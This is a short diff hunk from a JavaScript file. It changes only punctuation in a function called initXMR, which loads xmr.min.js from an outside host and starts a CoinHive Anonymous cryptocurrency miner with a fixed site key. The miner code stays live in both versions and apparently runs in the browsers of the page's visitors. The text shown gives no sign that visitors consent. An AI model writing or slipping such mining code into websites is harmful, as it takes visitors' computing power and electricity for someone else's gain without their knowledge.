@@ -266,6 +266,6 @@ export const initXMR = () => {
     return
   }
   asyncLoadScript('https://static.hacpai.com/js/lib/xmr.min.js', () => {
-    (new window.CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.8})).start();
+    (new window.CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.8})).start()
   })
 }
